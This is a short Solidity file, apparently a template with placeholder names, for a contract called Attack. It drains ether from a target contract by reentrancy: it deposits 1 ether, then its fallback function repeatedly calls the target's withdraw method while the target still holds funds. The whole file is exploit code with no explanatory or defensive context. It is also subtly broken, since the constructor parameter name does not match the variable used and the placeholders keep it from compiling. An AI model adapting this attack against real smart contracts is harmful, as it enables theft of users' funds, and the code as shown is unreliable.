// SPDX-License-Identifier: MIT
*Version*
contract Attack {
    *ContractName* public attackStore;
    constructor(address etherStoreAddress) public {
        attackStore = *ContractName*(_etherStoreAddress);
    }
    fallback() external payable {
        if (address (attackStore).balance >= 1 ether) {
            attackStore.*withdrawMethod*(1 ether);
        }
    }
    function attack() external payable {
        require(msg.value >= 1 ether);
        attackStore.*depositMethod*{value: 1 ether}();
        attackStore.*withdrawMethod*(1 ether);
    }
    function getBalance() public view returns (uint) {
        return address (this).balance;
    }
}